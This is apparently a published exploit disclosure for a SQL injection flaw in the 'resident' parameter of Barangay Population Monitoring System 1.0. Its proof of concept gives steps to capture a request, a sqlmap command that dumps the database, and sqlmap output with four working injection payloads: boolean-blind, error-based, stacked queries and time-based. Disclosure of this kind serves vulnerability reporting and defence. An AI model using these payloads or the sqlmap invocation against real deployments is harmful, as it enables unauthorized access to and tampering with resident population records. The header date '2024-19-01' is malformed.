# Barangay Population Monitoring System - SQL Injection
+ **Exploit Title:**  Barangay Population Monitoring System - SQL Injection
+ **Date:** 2024-19-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17109/barangay-population-monitoring-system-using-php-mysql-and-chartjs-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17109&title=Barangay+Population+Monitoring+System+Using+PHP%2C+MYSQL+and+Chart.js+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Repoerted, waiting for CVE number

## Description:
Barangay Population Monitoring System 1.0 allows SQL Injection via the 'resident' parameter in "/barangay-population-monitoring-system/endpoint/delete-resident.php?resident=32". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/barangay-population-monitoring-system/masterlist.php"
+ Select any resident and press the delete-resident button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /barangay-population-monitoring-system/endpoint/delete-resident.php?resident=32 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```
+ Use sqlmap to exploit. In sqlmap, use 'resident' parameter to dump the database.
```
sqlmap -r r.txt -p resident --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: resident (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: resident=32' RLIKE (SELECT (CASE WHEN (9622=9622) THEN 32 ELSE 0x28 END))-- uydw

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: resident=32' AND EXTRACTVALUE(8632,CONCAT(0x5c,0x71787a6a71,(SELECT (ELT(8632=8632,1))),0x7178707071))-- LFDZ

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: resident=32';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: resident=32' AND (SELECT 5502 FROM (SELECT(SLEEP(5)))BuUj)-- jvyg
---
[21:28:15] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[21:28:15] [INFO] fetching current database
[21:28:15] [INFO] retrieved: 'barangay_db'
current database: 'barangay_db'
```
+ current database: `barangay_db`

![Ekran görüntüsü 2024-01-19 053101](https://github.com/BurakSevben/CVEs/assets/117217689/576748ec-bc4c-474b-a324-fb6037ac894a)

